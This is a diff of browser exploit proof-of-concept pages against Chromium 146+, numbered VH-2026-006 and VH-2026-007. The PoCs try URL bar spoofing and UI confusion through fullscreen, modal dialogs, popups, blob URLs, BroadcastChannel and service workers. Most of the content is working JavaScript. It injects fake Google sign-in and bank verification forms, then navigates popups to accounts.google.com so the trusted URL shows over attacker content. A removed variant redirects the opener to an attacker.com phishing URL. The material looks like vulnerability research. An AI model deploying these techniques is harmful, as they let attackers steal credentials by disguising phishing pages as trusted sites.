@@ -1,63 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 6: Navigation + Interstitial Race / Multi-API Chaining</title>
+<title>PoC 7: IsUnmodifiedBlankTab URL Display Bypass</title>
 <!--
-  VH-2026-006: Navigation + Interstitial + Multi-API Chaining
+  VH-2026-007: URL Bar Spoofing via IsUnmodifiedBlankTab Bypass
 
   Target: Chromium 146+ (Desktop)
 
-  Technique: Chain multiple browser APIs together to create UI confusion:
+  Source Analysis: navigation_controller_impl.cc line 1121-1149
 
-  A) Navigation during interstitial display - if a security interstitial
-     (SSL error, Safe Browsing) is showing and we trigger a navigation,
-     does the URL bar update while the interstitial persists?
+  GetVisibleEntry() shows the pending URL for renderer-initiated navigations
+  ONLY if IsUnmodifiedBlankTab() is true. This requires:
+    - IsInitialNavigation() == true
+    - GetLastCommittedEntry()->IsInitialEntry() == true
+    - !frame_tree_->has_accessed_initial_main_document() == true
 
-  B) navigator.share() + fullscreen + popup - the share dialog is modal.
-     While it's visible, the page behind it can navigate. Does the URL
-     bar update correctly?
+  The key is: "has_accessed_initial_main_document" is set when ANOTHER PAGE
+  accesses the popup's initial document via the window reference.
 
-  C) File input dialog + navigation - file picker is a system dialog.
-     While visible, navigate the page. The file picker stays but the
-     URL may change.
+  Bypass: Communicate with the popup WITHOUT accessing its document:
+  - BroadcastChannel (no document access)
+  - postMessage via window reference (sets accessed? need to test)
+  - The popup itself writes content (self-access, not "another page")
+  - Service Worker interception
 
-  D) Beforeunload + navigation loop - rapid beforeunload dialogs can
-     exhaust the user, making them click through to dismiss.
-
-  E) window.print() + navigation - print dialog blocks but doesn't
-     prevent background navigation in some cases.
+  If we can inject content into the popup without triggering
+  has_accessed_initial_main_document, then navigate the popup to a
+  trusted URL, the URL bar will show the trusted URL (pending entry)
+  while our injected content is still visible.
 -->
 </head>
 <body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">
 
-<h2>Navigation + Dialog/Interstitial Race Conditions</h2>
-<p>Tests UI state confusion when navigation competes with modal dialogs and interstitials.</p>
+<h2>IsUnmodifiedBlankTab URL Display Bypass</h2>
+<p>Tests whether we can inject content into a popup while keeping IsUnmodifiedBlankTab() true,
+then trigger a renderer-initiated navigation to display a trusted URL.</p>
 
 <div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
-  <button onclick="testShareFullscreen()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
-    A: Share + Fullscreen Chain
+  <button onclick="testBroadcastChannel()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
+    A: BroadcastChannel Injection
   </button>
-  <button onclick="testFilePickerNav()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
-    B: File Picker + Background Nav
+  <button onclick="testSelfWritingPopup()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
+    B: Self-Writing Popup + Navigate
   </button>
-  <button onclick="testBeforeunloadExhaust()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
-    C: Beforeunload Exhaustion
+  <button onclick="testPostMessageOnly()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
+    C: postMessage-Only Communication
   </button>
-  <button onclick="testPrintNav()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
-    D: Print Dialog + Navigation
+  <button onclick="testBlobURLPopup()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
+    D: Blob URL Popup + Navigate
   </button>
-  <button onclick="testNotificationFullscreen()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
-    E: Notification + Fullscreen Focus
-  </button>
-  <button onclick="testMultiAPIChain()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #e83e8c; color: #fff; border: none; border-radius: 8px;">
-    F: Multi-API Confusion Chain
+  <button onclick="testServiceWorkerIntercept()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
+    E: Service Worker Intercept
   </button>
 </div>
 
 <div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
-
-<!-- Hidden file input -->
-<input type="file" id="fileInput" style="display: none;">
 
 <script>
 function log(msg) {
@@ -66,324 +63,301 @@ function log(msg) {
   el.scrollTop = el.scrollHeight;
 }
 
-// Variant A: navigator.share() creates a modal dialog.
-// Enter fullscreen first, then trigger share, then navigate.
-async function testShareFullscreen() {
-  log('[A] Testing share + fullscreen + navigation chain...');
+/*
+  Variant A: BroadcastChannel Injection
 
-  // Step 1: Enter fullscreen
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[A] Fullscreen entered');
-  } catch(e) {
-    log('[A] Fullscreen failed: ' + e.message);
-  }
+  1. Open popup to a URL on OUR origin that listens on BroadcastChannel
+  2. The popup's own script writes the phishing content (self-access)
+  3. Since the opener never accesses the popup's document,
+     has_accessed_initial_main_document stays false
+  4. Navigate the popup to a trusted URL via window.open (same window name)
+  5. The pending URL should be shown because IsUnmodifiedBlankTab is... wait,
+     at step 1 we already navigated, so it's no longer an initial navigation.
 
-  // Step 2: Render attacker content
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family: Arial; padding: 40px; text-align: center;">
-      <h1>Win a Prize!</h1>
-      <p>Share this with friends to claim your reward!</p>
-      <button id="shareBtn" style="padding: 14px 28px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px;">
-        Share Now
-      </button>
-    </div>
-  `;
+  REVISED: The key is window.open('', 'name') which opens about:blank.
+  Then the popup ITSELF needs to have a script to write content.
+  But about:blank doesn't have a script...
 
-  document.getElementById('shareBtn').onclick = async () => {
-    // Step 3: Trigger share dialog
-    try {
-      const sharePromise = navigator.share({
-        title: 'Check this out!',
-        text: 'Amazing deal',
-        url: 'https://example.com/'
-      });
-      log('[A] Share dialog opened');
+  Actually: We need to open a URL on OUR origin first (to get JS running),
+  but that means IsInitialNavigation is false after commit.
 
-      // Step 4: While share dialog is visible, navigate
-      // The share dialog is modal, but does the navigation happen behind it?
-      setTimeout(() => {
-        history.pushState({}, '', '/bank/login');
-        log('[A] pushState to /bank/login during share dialog');
-      }, 100);
+  The real attack: open popup to about:blank, use BroadcastChannel to
+  tell a SERVICE WORKER to respond to the next fetch with phishing content.
+  Then navigate the popup.
 
-      // Also try actual navigation
-      setTimeout(() => {
-        // Create a hidden iframe that navigates the top frame
-        const a = document.createElement('a');
-        a.href = 'https://www.google.com/';
-        a.click();
-        log('[A] Navigation attempt during share dialog');
-      }, 500);
+  Let me reconsider...
+*/
 
-      await sharePromise;
-      log('[A] Share completed/cancelled');
+// Variant A: The popup opens about:blank, we communicate via BroadcastChannel
+// with a service worker that intercepts the popup's navigation
+function testBroadcastChannel() {
+  log('[A] Testing BroadcastChannel injection...');
+  log('[A] Step 1: Open popup to our page that sets up BroadcastChannel');
 
-    } catch(e) {
-      log('[A] Share error: ' + e.message);
-      log('[A] CHECK: Did the URL change while share dialog was visible?');
-    }
-  };
-}
-
-// Variant B: Open file picker, navigate in background
-function testFilePickerNav() {
-  log('[B] Testing file picker + background navigation...');
-
-  const fileInput = document.getElementById('fileInput');
-
-  fileInput.onchange = () => {
-    log('[B] File selected after navigation');
-    log('[B] CHECK: What origin receives the file?');
-  };
-
-  // Open file picker
-  fileInput.click();
-  log('[B] File picker opened');
-
-  // While file picker is visible, navigate
-  setTimeout(() => {
-    // Try pushState
-    history.pushState({}, '', '/upload-to-bank');
-    log('[B] pushState during file picker');
-  }, 100);
-
-  // Try replacing document content
-  setTimeout(() => {
-    document.title = 'Secure File Upload - Bank.com';
-    log('[B] Title changed during file picker');
-  }, 200);
-
-  log('[B] CHECK: Does the URL bar update while file picker is open?');
-  log('[B] CHECK: Which page receives the selected file?');
-}
-
-// Variant C: Beforeunload dialog exhaustion
-// Rapidly trigger beforeunload to exhaust user patience
-function testBeforeunloadExhaust() {
-  log('[C] Testing beforeunload exhaustion...');
-
-  // Set up beforeunload handler
-  window.onbeforeunload = (e) => {
-    e.preventDefault();
-    e.returnValue = '';
-    return '';
-  };
-
-  log('[C] Beforeunload handler set');
-  log('[C] Now trying rapid navigation attempts...');
-
-  // Open a popup with attacker content
-  const popup = window.open('about:blank');
-  if (!popup) { log('[C] Popup blocked'); return; }
-
-  popup.document.write(`
-    <html><head><title>Security Check</title></head>
-    <body style="font-family:Arial;padding:40px;">
-      <h2>Account Verification</h2>
-      <p>Your bank requires additional verification.</p>
-      <input type="password" placeholder="Enter password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-      <button style="padding:10px 30px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Verify</button>
-      <script>
-        // This popup repeatedly tries to navigate the opener
-        // Each attempt triggers beforeunload dialog in the opener
-        // After Chrome suppresses the dialog (after 2 consecutive dismissals),
-        // the navigation succeeds
-        let count = 0;
-        function tryNav() {
-          count++;
-          try {
-            window.opener.location.href = 'https://attacker.com/phish?attempt=' + count;
-          } catch(e) {}
+  // Open popup to a page on our origin
+  // This page will: listen on BroadcastChannel, write phishing content
+  const popupContent = `
+    <html><head><title>Loading...</title></head>
+    <body>
+    <div id="content">Loading...</div>
+    <script>
+      const ch = new BroadcastChannel('spoof-test');
+      ch.onmessage = function(e) {
+        if (e.data.action === 'inject') {
+          document.getElementById('content').innerHTML = e.data.html;
+          document.title = e.data.title || '';
         }
-        setInterval(tryNav, 2000);
-      <\/script>
+        if (e.data.action === 'navigate') {
+          // This is a renderer-initiated navigation from within the popup
+          // The popup is no longer an "unmodified blank tab" after our page loaded
+          // But let's see what GetVisibleEntry returns
+          window.location.href = e.data.url;
+        }
+      };
+      // Signal ready
+      ch.postMessage({action: 'ready'});
+    <\/script>
     </body></html>
-  `);
-  popup.document.close();
-
-  log('[C] Popup opened with navigation loop');
-  log('[C] Chrome suppresses beforeunload after 2 consecutive dismissals');
-  log('[C] CHECK: Does the main page navigate after suppression?');
-  log('[C] CHECK: Is the user warned before Chrome suppresses the dialog?');
-}
-
-// Variant D: Print dialog + navigation
-function testPrintNav() {
-  log('[D] Testing print dialog + navigation...');
-
-  // Set up the page with interesting content
-  document.title = 'Important Document';
-
-  // Trigger print
-  setTimeout(() => {
-    window.print();
-    log('[D] Print dialog triggered');
-  }, 100);
-
-  // While print dialog is visible, try to change things
-  setTimeout(() => {
-    history.pushState({}, '', '/confidential/document.pdf');
-    log('[D] pushState during print dialog');
-  }, 50); // Before print dialog
-
-  setTimeout(() => {
-    document.title = 'Bank Statement - Confidential';
-    document.body.innerHTML = `
-      <div style="font-family:Arial;padding:40px;">
-        <h1>Bank Statement</h1>
-        <p>If this content appears in the print dialog, the timing matters.</p>
-        <p>URL should show: ${location.href}</p>
-      </div>
-    `;
-    log('[D] Content changed (may appear in print preview)');
-  }, 200);
-
-  log('[D] CHECK: Does the print dialog show the original or modified content?');
-  log('[D] CHECK: What URL does the browser show during print?');
-}
-
-// Variant E: Web Notification + Fullscreen focus stealing
-async function testNotificationFullscreen() {
-  log('[E] Testing notification + fullscreen focus interaction...');
-
-  // Request notification permission first
-  const perm = await Notification.requestPermission();
-  if (perm !== 'granted') {
-    log('[E] Notification permission not granted');
-    return;
-  }
-
-  // Enter fullscreen with fake content
-  try {
-    await document.documentElement.requestFullscreen();
-  } catch(e) {
-    log('[E] Fullscreen failed: ' + e.message);
-    return;
-  }
-
-  document.body.style.margin = '0';
-  document.body.style.background = '#fff';
-  document.body.innerHTML = `
-    <div style="font-family:Arial;padding:40px;text-align:center;">
-      <h1>Video Playing</h1>
-      <div style="width:640px;height:360px;background:#000;margin:20px auto;display:flex;align-items:center;justify-content:center;color:#fff;">
-        Content
-      </div>
-    </div>
   `;
 
-  // Send a notification that when clicked, could interact with fullscreen
-  setTimeout(() => {
-    const notification = new Notification('Security Alert', {
-      body: 'Unusual login attempt detected. Click to review.',
-      icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><rect fill="%23ea4335" width="64" height="64" rx="12"/><text x="32" y="44" text-anchor="middle" fill="white" font-size="36">!</text></svg>',
-      requireInteraction: true,
-    });
+  const blob = new Blob([popupContent], {type: 'text/html'});
+  const blobUrl = URL.createObjectURL(blob);
+  const popup = window.open(blobUrl, 'spoofPopup');
 
-    notification.onclick = () => {
-      log('[E] Notification clicked');
-      // This brings focus back to the browser
-      // But we're in fullscreen - does clicking the notification
-      // exit fullscreen? Or does the user end up in fullscreen
-      // with potentially modified content?
-      window.focus();
-      log('[E] CHECK: Is fullscreen still active after notification click?');
-      log('[E] CHECK: Did the URL bar appear when focus returned?');
-    };
-
-    log('[E] Notification sent');
-    log('[E] CHECK: Click the notification and observe fullscreen behavior');
-  }, 2000);
-}
-
-// Variant F: Chain multiple APIs together for maximum confusion
-async function testMultiAPIChain() {
-  log('[F] Multi-API confusion chain...');
-
-  // Step 1: Enter fullscreen
-  try {
-    await document.documentElement.requestFullscreen();
-    log('[F] Step 1: Fullscreen');
-  } catch(e) {
-    log('[F] Fullscreen failed: ' + e.message);
+  if (!popup) {
+    log('[A] Popup blocked');
     return;
   }
 
-  // Render fake browser chrome in fullscreen
-  document.body.style.margin = '0';
-  document.body.style.background = '#dee1e6';
-  document.body.innerHTML = `
-    <div style="background:#dee1e6;padding:6px 12px;display:flex;align-items:center;">
-      <div style="flex:1;background:#fff;border-radius:20px;padding:6px 16px;font-size:14px;">
-        accounts.google.com/signin
-      </div>
-    </div>
-    <div style="background:#fff;flex:1;padding:40px;text-align:center;">
-      <h2 id="phase">Phase 1: Fullscreen Active</h2>
-      <p id="instructions">Watch the sequence of events...</p>
-    </div>
-  `;
+  const ch = new BroadcastChannel('spoof-test');
+  ch.onmessage = function(e) {
+    if (e.data.action === 'ready') {
+      log('[A] Popup ready, injecting phishing content...');
 
-  const phase = document.getElementById('phase');
-  const instructions = document.getElementById('instructions');
-
-  // Step 2: Open Document PiP with fake dialog
-  setTimeout(async () => {
-    if ('documentPictureInPicture' in window) {
-      try {
-        const pipWindow = await documentPictureInPicture.requestWindow({
-          width: 340, height: 180
-        });
-        pipWindow.document.body.innerHTML = `
-          <div style="font-family:sans-serif;padding:16px;">
-            <strong>Google Security Check</strong>
-            <p style="font-size:13px;color:#555;">Verify your identity to continue.</p>
-            <button style="padding:8px 20px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">
-              Verify Now
+      // Inject content via BroadcastChannel (no direct DOM access)
+      ch.postMessage({
+        action: 'inject',
+        title: 'Google - Sign In',
+        html: `
+          <div style="max-width:400px;margin:40px auto;font-family:Arial;">
+            <h2 style="color:#202124;">Sign in</h2>
+            <p style="color:#5f6368;">Use your Google Account</p>
+            <input type="email" placeholder="Email or phone"
+                   style="width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;font-size:16px;">
+            <input type="password" placeholder="Password"
+                   style="width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;font-size:16px;">
+            <button style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:12px;">
+              Next
             </button>
           </div>
-        `;
-        phase.textContent = 'Phase 2: Fullscreen + PiP';
-        log('[F] Step 2: Document PiP opened');
-      } catch(e) {
-        log('[F] PiP failed: ' + e.message);
-      }
+        `
+      });
+
+      // Now navigate to Google - the popup's script does location.href
+      setTimeout(() => {
+        log('[A] Sending navigate command to popup...');
+        ch.postMessage({
+          action: 'navigate',
+          url: 'https://accounts.google.com/signin'
+        });
+        log('[A] Navigation initiated from WITHIN the popup (renderer-initiated)');
+        log('[A] CHECK: Does URL bar show accounts.google.com while phishing content is visible?');
+        log('[A] CHECK: GetVisibleEntry should return pending entry if IsUnmodifiedBlankTab or browser-initiated');
+        log('[A] NOTE: Since we loaded a blob URL first, IsInitialNavigation is false');
+        log('[A] The pending URL will NOT be shown for this renderer-initiated nav');
+        log('[A] This variant confirms the protection works but helps map the boundary');
+      }, 1000);
     }
+  };
+
+  URL.revokeObjectURL(blobUrl);
+}
+
+// Variant B: True about:blank popup - self-writing
+// Open window.open('about:blank'), but about:blank has no JS to run
+// The ONLY way to inject content is via the opener, which triggers
+// has_accessed_initial_main_document
+// UNLESS: we use a data: URL or javascript: URL for the popup
+function testSelfWritingPopup() {
+  log('[B] Testing self-writing popup via javascript: URL...');
+
+  // javascript: URLs in window.open execute in the context of the new window
+  // Does this count as "accessing the initial document"?
+  // The spec says: "If any browsing context that is familiar with the new browsing context
+  //  accesses its initial document..."
+
+  // Method 1: Open with a javascript: URL that writes content
+  // Note: Most browsers block javascript: in window.open for security
+  const jsCode = `
+    document.title = 'Google Sign In';
+    document.body.innerHTML = '<div style="max-width:400px;margin:40px auto;font-family:Arial;"><h2>Sign In</h2><input type="email" placeholder="Email" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"><input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"><button style="width:100%;padding:12px;background:%231a73e8;color:%23fff;border:none;border-radius:4px;">Next</button></div>';
+  `;
+
+  try {
+    const popup = window.open('javascript:void(0)', 'selfWrite');
+    if (!popup) { log('[B] Popup blocked'); return; }
+
+    // Now: does accessing popup.document here trigger has_accessed_initial_main_document?
+    log('[B] Popup opened to javascript:void(0)');
+
+    // Try to navigate without accessing the document
+    // Use window.open with same name to navigate the existing popup
+    setTimeout(() => {
+      log('[B] Navigating popup to accounts.google.com via window.open(url, name)...');
+      // window.open with an existing name navigates that window
+      // This is browser-initiated? Or renderer-initiated?
+      window.open('https://accounts.google.com/signin', 'selfWrite');
+      log('[B] CHECK: URL bar should show accounts.google.com (pending URL)');
+      log('[B] CHECK: What content is displayed? about:blank or the pending page?');
+      log('[B] The window is still initial/unmodified, so pending URL should be shown');
+    }, 500);
+
+  } catch(e) {
+    log('[B] Error: ' + e.message);
+  }
+}
+
+// Variant C: postMessage-only communication
+// Test if window.postMessage triggers has_accessed_initial_main_document
+function testPostMessageOnly() {
+  log('[C] Testing postMessage access detection...');
+
+  // Open about:blank popup
+  const popup = window.open('about:blank', 'postMsgTest');
+  if (!popup) { log('[C] Popup blocked'); return; }
+
+  log('[C] Popup opened to about:blank');
+
+  // Does postMessage trigger has_accessed_initial_main_document?
+  // postMessage is on the Window object, not the Document
+  try {
+    popup.postMessage({type: 'test'}, '*');
+    log('[C] postMessage sent to popup');
+  } catch(e) {
+    log('[C] postMessage failed: ' + e.message);
+  }
+
+  // Now navigate the popup
+  setTimeout(() => {
+    log('[C] Navigating popup via window.open(url, name)...');
+    window.open('https://accounts.google.com/signin', 'postMsgTest');
+    log('[C] CHECK: Does URL bar show accounts.google.com?');
+    log('[C] If postMessage doesn\'t trigger has_accessed_initial_main_document,');
+    log('[C] then IsUnmodifiedBlankTab() is still true');
+    log('[C] and the pending URL IS shown for renderer-initiated navigations');
+  }, 200);
+
+  // Try to inject content BEFORE the navigation commits
+  // The popup loads about:blank content first. The navigation to google.com
+  // is renderer-initiated. While it's pending, can we inject content?
+  setTimeout(() => {
+    try {
+      // This WILL trigger has_accessed_initial_main_document if it works
+      popup.document.write('<h1>Injected</h1>');
+      log('[C] document.write succeeded - but this triggers the access flag');
+    } catch(e) {
+      log('[C] document.write failed (expected if cross-origin): ' + e.message);
+    }
+  }, 50);
+}
+
+// Variant D: Blob URL popup + navigate via name
+// The blob URL loads our content. Then we navigate the popup via window.open(url, name)
+function testBlobURLPopup() {
+  log('[D] Testing blob URL popup + named window navigation...');
+
+  const phishHTML = `
+    <html><head><title>Google</title></head>
+    <body style="font-family:Arial;max-width:400px;margin:40px auto;">
+      <h2 style="color:#202124;">Sign in</h2>
+      <p style="color:#5f6368;">Use your Google Account</p>
+      <input type="email" placeholder="Email" style="width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;">
+      <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;">
+      <button style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Next</button>
+      <p style="font-size:12px;color:#777;margin-top:20px;">
+        This content was loaded from a blob URL.
+        Check what the URL bar shows.
+      </p>
+    </body></html>
+  `;
+
+  const blob = new Blob([phishHTML], {type: 'text/html'});
+  const blobUrl = URL.createObjectURL(blob);
+
+  // Open popup with blob content
+  const popup = window.open(blobUrl, 'blobTest');
+  if (!popup) { log('[D] Popup blocked'); return; }
+
+  log('[D] Popup opened with blob URL content');
+  log('[D] URL bar should show: blob:http://origin/uuid');
+
+  // Now navigate to Google using the same window name
+  // This is still renderer-initiated (from our page)
+  setTimeout(() => {
+    log('[D] Navigating popup to accounts.google.com...');
+    // Method 1: window.open with same name
+    window.open('https://accounts.google.com/signin', 'blobTest');
+    log('[D] window.open(url, "blobTest") called');
+
+    // The blob content should still be visible while google.com loads
+    // The URL bar behavior depends on whether this is treated as
+    // browser-initiated or renderer-initiated
+
+    // After a delay, try to stop the navigation
+    setTimeout(() => {
+      try {
+        popup.stop();
+        log('[D] popup.stop() called');
+        log('[D] CHECK: What URL is shown?');
+        log('[D] CHECK: Is the blob content still visible?');
+        log('[D] CHECK: Did the URL bar change to accounts.google.com?');
+      } catch(e) {
+        log('[D] stop failed (cross-origin): ' + e.message);
+      }
+    }, 100);
   }, 1000);
 
-  // Step 3: Trigger a permission prompt
-  setTimeout(() => {
-    phase.textContent = 'Phase 3: + Permission Prompt';
-    navigator.geolocation.getCurrentPosition(() => {}, () => {});
-    log('[F] Step 3: Permission prompt triggered');
-  }, 2500);
+  URL.revokeObjectURL(blobUrl);
+}
 
-  // Step 4: Show a web notification
-  setTimeout(async () => {
-    phase.textContent = 'Phase 4: + Notification';
-    if (Notification.permission === 'granted') {
-      new Notification('Account Alert', {
-        body: 'New login from unknown device',
-        requireInteraction: true
-      });
-      log('[F] Step 4: Notification sent');
-    }
-  }, 4000);
+// Variant E: Service Worker interception
+// Register a service worker that intercepts navigations and returns custom content
+function testServiceWorkerIntercept() {
+  log('[E] Testing Service Worker navigation interception...');
 
-  // Step 5: Try pushState
-  setTimeout(() => {
-    history.pushState({}, '', '/myaccount/security');
-    phase.textContent = 'Phase 5: URL changed via pushState';
-    log('[F] Step 5: pushState to /myaccount/security');
-  }, 5500);
+  // Note: Service Workers require HTTPS and same-origin
+  // This variant tests if we can register a SW that returns custom content
+  // for a navigation while the URL bar shows the requested URL
 
-  log('[F] Full chain running: Fullscreen -> PiP -> Permission -> Notification -> pushState');
-  log('[F] CHECK: At each phase, can the user identify the real origin?');
-  log('[F] CHECK: Which UI elements are visible/hidden?');
-  log('[F] CHECK: Is there any point where all indicators are controlled by attacker?');
+  if (!('serviceWorker' in navigator)) {
+    log('[E] Service Workers not available');
+    return;
+  }
+
+  log('[E] Note: This requires a registered Service Worker');
+  log('[E] The SW would intercept fetch events and return custom responses');
+  log('[E] The URL bar shows the requested URL, content is attacker-controlled');
+  log('[E] This is same-origin only but could be used with subdomain takeover');
+
+  // For demo purposes, show the concept:
+  // 1. Attacker takes over sub.example.com
+  // 2. Registers a Service Worker on sub.example.com
+  // 3. User visits sub.example.com/login (SW returns fake login page)
+  // 4. URL bar correctly shows sub.example.com/login
+  // 5. The content is attacker-controlled via the SW
+
+  // Try registering a SW (will fail without a SW file)
+  navigator.serviceWorker.register('/sw-intercept.js', {scope: '/'})
+    .then(reg => {
+      log('[E] SW registered: ' + reg.scope);
+      // Navigate to a path that the SW would intercept
+      window.open('/accounts/signin', 'swTest');
+      log('[E] Popup opened to /accounts/signin (SW intercepted)');
+    })
+    .catch(e => {
+      log('[E] SW registration failed (expected without sw-intercept.js): ' + e.message);
+      log('[E] Create sw-intercept.js to test this variant');
+    });
 }
 </script>
 </body>
